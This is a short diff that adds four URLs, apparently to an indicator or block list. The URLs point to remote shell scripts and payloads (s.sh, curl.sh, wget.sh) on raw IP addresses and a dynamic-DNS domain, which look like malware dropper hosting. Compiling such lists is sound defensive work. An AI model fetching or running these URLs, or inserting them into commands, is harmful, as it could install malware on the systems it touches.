@@ -1,0 +1,4 @@
+http://45.148.10.186/s.sh
+http://98.159.110.37/53
+http://bpsuck.hldns.ru/curl.sh
+http://bpsuck.hldns.ru/wget.sh
